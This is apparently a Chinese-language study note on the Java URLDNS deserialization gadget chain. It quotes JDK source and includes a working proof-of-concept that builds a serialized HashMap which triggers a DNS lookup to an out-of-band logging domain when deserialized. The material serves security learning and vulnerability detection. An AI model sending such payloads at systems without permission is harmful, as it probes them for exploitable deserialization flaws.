#### urldns 常用来去探测是否存在java反序列化漏洞，并且此链不限制jdk版本，采用java内置类，不需要第三方依赖，在目标无回显的时候，就可以通过dns请求去验证是否存在反序列化漏洞，但是只能用来发起dns请求

 初始点 HashMap.readObject方法
 ```java
 private void readObject(java.io.ObjectInputStream s)  
    throws IOException, ClassNotFoundException {  
    // Read in the threshold (ignored), loadfactor, and any hidden stuff  
    s.defaultReadObject();  
    reinitialize();  
    if (loadFactor <= 0 || Float.isNaN(loadFactor))  
        throw new InvalidObjectException("Illegal load factor: " +  
                                         loadFactor);  
    s.readInt();                // Read and ignore number of buckets  
    int mappings = s.readInt(); // Read number of mappings (size)  
    if (mappings < 0)  
        throw new InvalidObjectException("Illegal mappings count: " +  
                                         mappings);  
    else if (mappings > 0) { // (if zero, use defaults)  
        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);  
        float fc = (float)mappings / lf + 1.0f;  
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?  
                   DEFAULT_INITIAL_CAPACITY :  
                   (fc >= MAXIMUM_CAPACITY) ?  
                   MAXIMUM_CAPACITY :  
                   tableSizeFor((int)fc));  
        float ft = (float)cap * lf;  
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?  
                     (int)ft : Integer.MAX_VALUE);  
        @SuppressWarnings({"rawtypes","unchecked"})  
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];  
        table = tab;  
  
        // Read the keys and values, and put the mappings in the HashMap  
        for (int i = 0; i < mappings; i++) {  
            @SuppressWarnings("unchecked")  
                K key = (K) s.readObject();  
            @SuppressWarnings("unchecked")  
                V value = (V) s.readObject();  
            putVal(hash(key), key, value, false, false);  
        }  
    }  
}
```
这里的hash方法代码为
```java
static final int hash(Object key) {  
    int h;  
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  
}
```
可以发现这里会调用传入对象的hashCode方法
并且发现 URL.java
```java
	public synchronized int hashCode() {  
    if (hashCode != -1)  
        return hashCode;  
  
    hashCode = handler.hashCode(this);  
    return hashCode;  
}
```
o.hashCode-> o.handler.hashCode
```java
protected int hashCode(URL u) {  
    int h = 0;  
  
    // Generate the protocol part.  
    String protocol = u.getProtocol();  
    if (protocol != null)  
        h += protocol.hashCode();  
  
    // Generate the host part.  
    InetAddress addr = getHostAddress(u);  
    if (addr != null) {  
        h += addr.hashCode();  
    } else {  
        String host = u.getHost();  
        if (host != null)  
            h += host.toLowerCase().hashCode();  
    }  
  
    // Generate the file part.  
    String file = u.getFile();  
    if (file != null)  
        h += file.hashCode();  
  
    // Generate the port part.  
    if (u.getPort() == -1)  
        h += getDefaultPort();  
    else  
        h += u.getPort();  
  
    // Generate the ref part.  
    String ref = u.getRef();  
    if (ref != null)  
        h += ref.hashCode();  
  
    return h;  
}
```

这边可以写一个demo来表现hashCode中getHostAddress方法调用结果
```java
package org.example;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.net.MalformedURLException;  
import java.net.URL;  
import java.text.SimpleDateFormat;  
import java.util.Date;  
import java.util.HashMap;  
  
public class Urldns {  
    public static <ObjectInputStream> void main(String[] args) throws Exception {  
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();  
        hashMap.put(new URL("http://lfdekfh8.eyes.sh"),1);  
        serialize(hashMap);  
  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream  objectOutputStream = new ObjectOutputStream(new FileOutputStream("dns.ser"));  
        objectOutputStream.writeObject(obj);  
      }  
}
```
代码中只进行了序列化操作，但是这里可以发现已经出现了dns请求
![[Pasted image 20250612130104.png]]
原因就在于hashCode方法中如果hashCode == -1，而一开始hashCode的值就初始化为-1, 就会直接执行hashCode = handler.hashCode(this)，因此序列化也导致其发送dns解析请求，但我们是希望他只在反序列化的时候进行，这样直接进行不符合预期。因此在调用前采用反射去修改hashCode对应的值
payload
```java
package org.example;  
  
import java.io.FileInputStream;  
import java.io.FileOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.net.MalformedURLException;  
import java.net.URL;  
import java.util.HashMap;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
            HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();  
            URL url = new URL("http://lfdekfh8.eyes.sh");  
            Class c = url.getClass();  
            Field field = c.getDeclaredField("hashCode");  
            field.setAccessible(true);  
            field.set(url, 209);  
            hashMap.put(url, 1);  
            field.set(url, -1);  
            serialize(hashMap);  
        unserialize("dns.bin");  
    }  
    public static void serialize(Object object) throws Exception{  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("dns.bin"));  
        objectOutputStream.writeObject(object);  
    }  
    public static void unserialize(String fileName) throws Exception{  
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));  
        objectInputStream.readObject();  
    }  
}
```

![[Pasted image 20250612133617.png]]综上URLDNS链
```java
Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode()
```